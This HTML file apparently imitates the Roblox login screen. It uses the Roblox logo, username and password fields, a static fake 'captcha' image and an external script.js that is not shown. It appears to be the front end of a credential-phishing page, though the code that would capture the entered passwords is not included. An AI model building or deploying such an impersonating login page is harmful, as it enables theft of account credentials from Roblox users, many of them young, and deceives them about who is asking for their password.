<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="login-card">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_logo_2022.svg" alt="Roblox Logo" class="logo">
            <h2>Login to Roblox</h2>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Username" required>
                <input type="password" id="password" placeholder="Password" required>
                <div class="captcha-area">
                    <p>Verify you are human (Captcha)</p>
                    <img src="https://i.imgur.com/S8u3UoX.png" alt="Captcha" class="captcha-img">
                </div>
                <button type="submit">Login</button>
            </form>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
